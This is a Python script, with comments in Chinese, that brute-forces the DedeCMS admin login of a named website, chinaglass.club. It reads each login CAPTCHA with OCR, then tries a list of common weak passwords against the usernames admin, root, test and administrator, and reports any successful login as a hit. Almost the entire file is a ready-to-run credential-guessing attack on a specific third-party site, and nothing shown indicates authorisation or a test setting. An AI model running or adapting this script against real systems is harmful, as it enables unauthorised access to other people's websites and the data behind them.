#!/usr/bin/env python3
"""bf_dede_cg.py - chinaglass.club DedeCMS后台爆破 (验证码OCR)
表单: userid/pwd/validate + 验证码 /include/vdimgck.php
"""
import urllib.request, urllib.parse, ssl, re, http.cookiejar, sys, time
import ddddocr

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0"}
BASE = "http://chinaglass.club"

PASSWORDS = ["admin", "admin123", "123456", "admin888", "12345678", "password",
             "admin@123", "admin1234", "123456a", "a123456", "666666", "888888",
             "000000", "qwer1234", "abc123", "admin666", "123123", "111111",
             "654321", "admin2023", "admin2024", "Admin123", "123qwe", "zxcvbnm",
             "admin12345", "root", "root123", "test", "test123", "admin!@#",
             "dedecms", "dede123", "chinaglass", "glass123", "admin@2019"]

def main():
    ocr = ddddocr.DdddOcr(show_ad=False)
    for round_no in range(1, 4):
        print("=== round %d ===" % round_no, flush=True)
        cj = http.cookiejar.CookieJar()
        opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj),
                                             urllib.request.HTTPSHandler(context=ctx))
        # 拿登录页cookie
        try:
            opener.open(urllib.request.Request(BASE + "/admin/login.php", headers=UA), timeout=10).read()
        except Exception:
            pass
        # 验证码
        try:
            r = opener.open(urllib.request.Request(BASE + "/include/vdimgck.php", headers=UA), timeout=10)
            img = r.read()
            code = ocr.classification(img)
            print("captcha: %s" % code, flush=True)
        except Exception as e:
            print("captcha err:", repr(e), flush=True)
            continue

        for user in ["admin", "root", "test", "administrator"]:
            for pw in PASSWORDS:
                data = urllib.parse.urlencode({
                    "gotopage": "/admin/", "dopost": "login", "adminstyle": "newdedecms",
                    "userid": user, "pwd": pw, "validate": code
                }).encode()
                try:
                    req = urllib.request.Request(BASE + "/admin/login.php", data=data,
                                                 headers={**UA, "Content-Type": "application/x-www-form-urlencoded",
                                                          "Referer": BASE + "/admin/login.php"})
                    resp = opener.open(req, timeout=10)
                    b = resp.read(10000).decode("utf-8", "ignore")
                    fu = resp.geturl()
                    st = resp.status
                except urllib.error.HTTPError as e:
                    st, b, fu = e.code, e.read(10000).decode("utf-8", "ignore"), e.geturl()
                except Exception as e:
                    print("err:", repr(e)[:80], flush=True)
                    continue
                # 验证码错误
                if "验证码" in b and ("不正确" in b or "错误" in b):
                    print("captcha expired, retry", flush=True)
                    break
                # 密码错误
                if "密码" in b and ("不正确" in b or "错误" in b):
                    if pw == PASSWORDS[0]:
                        print("  sample: %s" % b[:120].replace("\n", " "), flush=True)
                    break
                # 成功: 跳转到后台主页
                if st == 302 and "login" not in fu.lower():
                    print("!!! HIT: %s/%s -> %s" % (user, pw, fu), flush=True)
                    sys.exit(0)
                if "dedecms" in b and ("index" in fu or "main" in fu or "后台" in b):
                    if "密码" not in b:
                        print("!!! HIT: %s/%s -> %s" % (user, pw, fu), flush=True)
                        sys.exit(0)
                print("  %s/%s -> st=%d" % (user, pw, st), flush=True)
        print("round %d done" % round_no, flush=True)
        time.sleep(2)
    print("=== NO HIT ===")

if __name__ == "__main__":
    main()
